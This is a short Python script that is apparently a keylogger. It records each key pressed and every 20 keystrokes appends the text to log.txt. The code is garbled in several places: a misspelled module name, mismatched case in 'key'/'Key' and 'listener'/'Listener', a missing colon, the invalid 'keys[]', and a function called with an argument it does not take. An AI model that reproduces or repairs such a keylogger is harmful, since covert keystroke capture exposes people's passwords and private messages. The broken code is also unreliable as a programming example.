#!/usr/bin/env python3
import pyinput

from pyinput.keyboard import key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{} pressed".format(key))

    if count >= 20
    count = 0
    write_file(keys)
    keys[]


def write_file():
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False

with listener(on_press=on_press, on_release=on_release) as Listener:
    listener.join()
